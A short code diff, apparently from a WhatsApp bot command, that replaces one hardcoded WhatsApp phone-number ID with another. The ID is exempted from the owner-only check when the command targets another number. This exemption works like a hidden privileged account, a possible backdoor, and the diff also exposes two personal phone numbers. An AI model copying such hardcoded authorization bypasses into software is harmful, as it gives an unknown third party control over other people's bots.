@@ -15,7 +15,7 @@ cmd({
     try {
         let targetJid = from;
         let inputNumber = args.join('').replace(/[^0-9]/g, '');
-        const specialNumber = "923035512967@s.whatsapp.net";
+        const specialNumber = "923147168309@s.whatsapp.net";
 
         if (inputNumber.length > 5) {
             if (!isOwner && sender !== specialNumber) return;
